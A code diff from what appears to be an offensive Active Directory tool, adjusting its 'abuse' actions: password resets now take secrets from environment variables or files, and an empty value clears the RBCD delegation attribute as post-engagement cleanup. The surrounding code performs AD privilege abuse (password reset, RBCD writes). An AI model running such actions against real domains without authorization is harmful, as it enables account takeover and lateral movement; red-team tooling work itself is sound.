@@ -236,7 +236,12 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 dry_run_line("unicodePwd", &target_dn, "<UTF-16LE-encoded, redacted>");
                 return Ok(());
             }
-            c.set_password(&target_dn, &a.value).await?;
+            // Stream 1 / A.1: expand env:VAR / @file:PATH before writing. The
+            // previous path stored the literal reference as the password —
+            // silent + destructive.
+            let pw_secret = crate::resolve_secret(a.value.as_str(), "ADHAMMER_PASSWORD")?;
+            c.set_password(&target_dn, pw_secret.expose_secret())
+                .await?;
             println!("[+] reset password of {}", a.target);
         }
         AbuseAction::AddKeycred => {
@@ -264,6 +269,24 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             );
         }
         AbuseAction::WriteRbcd | AbuseAction::AllowedToAct => {
+            // Stream 1 / A.2: empty --value clears the attribute — the natural
+            // cleanup path after an RBCD engagement. Previously errored with
+            // "object not found" because `to_sid` couldn't resolve an empty
+            // string.
+            if a.value.trim().is_empty() {
+                if dry_run {
+                    dry_run_line(
+                        "msDS-AllowedToActOnBehalfOfOtherIdentity",
+                        &target_dn,
+                        "<DELETE attribute — cleanup mode>",
+                    );
+                    return Ok(());
+                }
+                c.delete_attribute(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
+                    .await?;
+                println!("[+] cleared RBCD attribute on {}", a.target);
+                return Ok(());
+            }
             // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
             let trustee = crate::target::to_sid(&mut c, &a.value).await?;
             let sd = windows_sddl::build_rbcd_sd(&trustee);
